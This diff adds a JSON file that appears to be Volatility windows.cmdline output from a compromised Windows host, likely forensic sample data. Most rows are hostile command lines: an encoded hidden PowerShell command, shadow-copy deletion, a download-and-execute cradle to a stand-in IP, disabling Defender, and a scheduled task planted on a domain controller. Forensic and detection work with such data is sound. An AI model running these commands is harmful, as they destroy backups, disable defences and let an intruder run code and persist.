@@ -1,0 +1,40 @@
+{
+  "plugin": "windows.cmdline",
+  "rows": [
+    {
+      "PID": 4471,
+      "Process": "svchost_updater.exe",
+      "Args": "C:\\ProgramData\\svchost_updater.exe -s"
+    },
+    {
+      "PID": 9012,
+      "Process": "powershell.exe",
+      "Args": "powershell.exe -NoP -W hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABuAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+    },
+    {
+      "PID": 9013,
+      "Process": "cmd.exe",
+      "Args": "cmd.exe /c vssadmin delete shadows /all /quiet"
+    },
+    {
+      "PID": 9014,
+      "Process": "powershell.exe",
+      "Args": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.44/stage2.ps1')\""
+    },
+    {
+      "PID": 9015,
+      "Process": "powershell.exe",
+      "Args": "powershell.exe -c \"Set-MpPreference -DisableRealtimeMonitoring $true\""
+    },
+    {
+      "PID": 9016,
+      "Process": "schtasks.exe",
+      "Args": "schtasks /s DC-EU-031 /create /tn OneDriveMaintenanceTask /tr C:\\Windows\\System32\\Tasks\\svc.exe /sc minute /mo 5"
+    },
+    {
+      "PID": 3120,
+      "Process": "explorer.exe",
+      "Args": "C:\\Windows\\explorer.exe"
+    }
+  ]
+}
